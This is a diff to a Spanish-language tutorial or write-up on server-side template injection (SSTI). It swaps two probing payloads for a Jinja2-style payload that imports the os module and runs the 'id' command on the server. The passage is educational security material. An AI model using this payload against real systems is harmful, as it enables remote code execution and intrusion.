@@ -77,8 +77,7 @@ Hola, 49
 Lo que confirma la **vulnerabilidad SSTI**. Desde aquí, el atacante puede ir más allá probando payloads como:
 
 ```txt
-{{config}}
-{{''.__class__.__mro__[1].__subclasses__()}}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
 Esto puede conducir a ejecución de código en el servidor dependiendo del entorno.
